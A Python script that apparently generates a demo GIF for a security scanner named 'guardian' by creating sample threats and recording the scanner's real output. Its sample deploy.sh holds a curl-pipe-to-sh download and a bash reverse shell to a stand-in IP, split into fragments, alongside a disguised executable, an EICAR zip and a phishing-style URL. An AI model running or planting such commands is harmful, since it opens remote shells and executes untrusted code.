"""Regenerate docs/demo.gif by running the REAL guardian commands.

Nothing in the GIF is faked: this script creates sample files, runs the actual
`guardian` command line, captures its real output, and draws that text as an
animated terminal. If you change Guardian's output, run this again.

    pip install pillow
    python tools/make_demo_gif.py
"""

import os
import subprocess
import sys
import tempfile
import textwrap
import zipfile
from pathlib import Path

from PIL import Image, ImageDraw, ImageFont

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
from guardian.signatures import EICAR  # noqa: E402

W, H, PAD, LINE_H, FONT_SIZE = 880, 520, 18, 21, 15
BG, FG, DIM = "#1b1d23", "#d7dae0", "#7f848e"
GREEN, RED, YELLOW, BLUE = "#98c379", "#e06c75", "#e5c07b", "#61afef"
COMMANDS = [
    "guardian scan samples",
    'guardian url "http://paypal.secure-login.example.xyz/verify"',
    "guardian explain samples/deploy.sh",
]


def make_samples(base: Path) -> None:
    s = base / "samples"
    s.mkdir()
    (s / "notes.txt").write_text("shopping list: milk, eggs")
    (s / "holiday.jpg").write_bytes(b"MZ" + b"\0" * 300)       # a program wearing a photo's name
    with zipfile.ZipFile(s / "invoice_Nov.zip", "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("readme.txt", "please see attached")
        z.writestr("payment.txt", EICAR)                       # harmless industry test string
    pieces = ["curl http://203.0.113.5/a.sh | ", "sh\n", "bash -i >", "& /dev/tcp/203.0.113.5/9 0>&1\n"]
    (s / "deploy.sh").write_bytes("".join(pieces).encode())


def run_real(cmds: list) -> list:
    base = Path(tempfile.mkdtemp())
    make_samples(base)
    bindir = base / "bin"
    bindir.mkdir()
    wrapper = bindir / "guardian"
    wrapper.write_text(f'#!/bin/sh\nexec "{sys.executable}" -m guardian "$@"\n')
    wrapper.chmod(0o755)
    env = dict(os.environ, GUARDIAN_HOME=str(base / "data"), PYTHONPATH=str(ROOT),
               PATH=f"{bindir}{os.pathsep}{os.environ['PATH']}")
    out = []
    for c in cmds:
        r = subprocess.run(c, shell=True, cwd=base, env=env, capture_output=True, text=True)
        out.append(r.stdout.rstrip("\n").splitlines())
    return out


def load_font() -> ImageFont.ImageFont:
    for p in ("/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf", "C:/Windows/Fonts/consola.ttf",
              "/System/Library/Fonts/Menlo.ttc", "/Library/Fonts/Courier New.ttf"):
        if Path(p).exists():
            return ImageFont.truetype(p, FONT_SIZE)
    return ImageFont.load_default()


def line_segments(text: str):
    """Split a line into (text, colour) pieces so tags and verdicts stand out."""
    for tag, col in (("[BAD ]", RED), ("[WARN]", YELLOW), ("[ OK ]", GREEN)):
        if text.startswith(tag):
            return [(tag, col), (text[len(tag):], FG)]
    if text.startswith("$ "):
        return [("$ ", GREEN), (text[2:], FG)]
    if text.startswith(" "):             # indented lines are reasons (and their wrapped tails)
        return [(text, DIM)]
    if text.startswith("Verdict: MALICIOUS") or "HIGH RISK" in text:
        return [(text, RED)]
    if text.startswith("Verdict: SUSPICIOUS") or "CAUTION" in text:
        return [(text, YELLOW)]
    if text.startswith(("Scanned", "Risk", "File:")):
        return [(text, BLUE)]
    return [(text, FG)]


def render(lines: list, font, cursor: bool = False) -> Image.Image:
    img = Image.new("RGB", (W, H), BG)
    d = ImageDraw.Draw(img)
    d.rectangle([0, 0, W, 34], fill="#14161b")
    for i, c in enumerate(("#ff5f56", "#ffbd2e", "#27c93f")):
        d.ellipse([16 + i * 22, 11, 28 + i * 22, 23], fill=c)
    d.text((W // 2 - 90, 9), "guardian - demo", font=font, fill=DIM)
    rows = (H - 34 - PAD * 2) // LINE_H
    y = 34 + PAD
    for text in lines[-rows:]:
        x = PAD
        for seg, col in line_segments(text):
            d.text((x, y), seg, font=font, fill=col)
            x += d.textlength(seg, font=font)
        y += LINE_H
    if cursor:
        d.rectangle([x if lines else PAD, y - LINE_H + 2, (x if lines else PAD) + 8, y - 4], fill=FG)
    return img


def main() -> None:
    outputs = run_real(COMMANDS)
    font = load_font()
    frames, durations, screen = [], [], []
    cols = int((W - 2 * PAD) / font.getlength("M")) - 1       # characters that fit on one row
    shot_index = None

    def add(ms: int, cursor: bool = False) -> None:
        frames.append(render(screen, font, cursor))
        durations.append(ms)

    for cmd, out in zip(COMMANDS, outputs):
        screen.append("$ ")
        for i in range(0, len(cmd), 4):                       # "typing"
            screen[-1] = "$ " + cmd[: i + 4]
            add(55, cursor=True)
        add(350)
        for line in out:                                      # output appears line by line
            indent = " " * (len(line) - len(line.lstrip()) + 2)
            for piece in textwrap.wrap(line, cols, subsequent_indent=indent) or [""]:
                screen.append(piece)                          # wrap so nothing is cut off
                add(130)
        add(1700)                                             # pause so it can be read
        if shot_index is None:
            shot_index = len(frames) - 1                      # screenshot = first command's results
        screen.append("")
    add(2500)

    docs = ROOT / "docs"
    docs.mkdir(exist_ok=True)
    pal = [f.convert("P", palette=Image.ADAPTIVE, colors=24) for f in frames]
    pal[0].save(docs / "demo.gif", save_all=True, append_images=pal[1:], duration=durations,
                loop=0, optimize=True, disposal=1)
    frames[shot_index].save(docs / "screenshot.png", optimize=True)
    print(f"Wrote {docs / 'demo.gif'} ({(docs / 'demo.gif').stat().st_size // 1024} KB, {len(frames)} frames)")


if __name__ == "__main__":
    main()
